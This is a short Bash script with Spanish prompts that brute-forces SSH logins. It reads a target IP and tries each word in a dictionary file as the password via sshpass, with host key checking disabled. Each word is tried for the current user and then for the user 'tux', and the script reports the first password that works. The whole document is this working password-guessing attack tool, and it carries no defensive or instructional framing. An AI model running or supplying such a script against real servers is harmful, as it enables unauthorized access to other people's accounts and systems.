#!/bin/bash
echo "Ingrese IP servidor:"
read -r IP
while read -ra line;
do
   sshpass -p $line ssh -o StrictHostKeyChecking=no $IP hostname > /dev/null
   if [ $? -eq 0 ]
   then
     echo "Encontrado!"
     echo " "
     echo "El pwd es: $line"
   else
     echo "Buscando..."
     sshpass -p $line ssh -o StrictHostKeyChecking=no tux@$IP hostname > /dev/null
     if [ $? -eq 0 ]
     then
       echo "Encontrado!"
       echo " "
       echo "El usuario es tux"
       echo "el pwd es: $line"
     else
       echo "Buscando..."
     fi

   fi

#echo $line
#echo $IP
done < diccionario.txt